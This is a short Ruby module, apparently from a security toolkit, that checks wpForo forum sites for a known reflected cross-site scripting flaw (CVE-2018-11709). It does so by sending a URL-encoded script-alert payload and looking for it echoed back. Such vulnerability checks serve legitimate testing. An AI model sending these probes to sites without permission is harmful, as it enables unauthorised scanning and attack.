# frozen_string_literal: true

require 'httparty'
module Snackhack2
  class WPForoForum
    attr_accessor :site
    def initialize
      @site = site
    end

    # wpForo Forum <= 1.4.11 - Unauthenticated Reflected Cross-Site Scripting (XSS)
    # source: https://github.com/prok3z/Wordpress-Exploits/tree/main/CVE-2018-11709
    def run
      wp = HTTParty.get(File.join(@site, '/index.php/community/?%22%3E%3Cscript%3Ealert(/XSS/)%3C/script%3E'))
      if wp.code == 200
        puts "[+] #{@site} is vulnerable to CVE-2018-11709..." if wp.match(/XSS/)
      else
        puts "[+] HTTP code #{wp.code}"
      end
    end
  end
end
